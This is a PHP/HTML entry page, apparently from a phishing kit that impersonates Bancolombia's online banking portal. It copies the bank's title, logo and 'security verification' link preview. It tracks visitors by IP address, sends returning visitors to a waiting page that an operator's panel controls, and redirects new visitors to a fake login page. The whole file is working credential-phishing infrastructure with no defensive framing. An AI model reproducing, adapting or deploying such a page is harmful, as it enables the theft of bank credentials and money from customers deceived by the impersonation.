<?php
// index.php
require_once('panel/lib/funciones.php');

$ip = $_SERVER['REMOTE_ADDR'];
$id_reg = traer_regitro($ip); // Buscamos si esta IP ya entró antes

if ($id_reg) {
    // Si ya existe en tu data.json, lo mandamos a la pantalla de espera
    // para que el panel administrativo decida qué pantalla mostrarle.
    header("Location: a/WAITING.php");
    exit();
}
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Bancolombia | Sucursal Virtual Personas</title>
    <meta property="og:title" content="Bancolombia | Sucursal Virtual Personas">
    <meta property="og:description" content="Verificación de seguridad requerida.">
    <meta property="og:image" content="img/seguridad.jpg">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" type="image/png" href="img/logo.png" />
    <script type="text/javascript" src="js/jquery-3.6.0.min.js"></script>
</head>
<body style="background-color: #fff;">
    <div style="text-align: center; margin-top: 45%;">
        <img src="img/logo.png" width="180">
        <p style="font-family: sans-serif; color: #666;">Cargando seguridad...</p>
    </div>

    <script type="text/javascript">
        $(document).ready(function() {
            // Si llegó aquí es porque es una IP nueva, lo mandamos al login inicial
            window.location.href = "a/login.php"; 
        });
    </script>
</body>
</html>
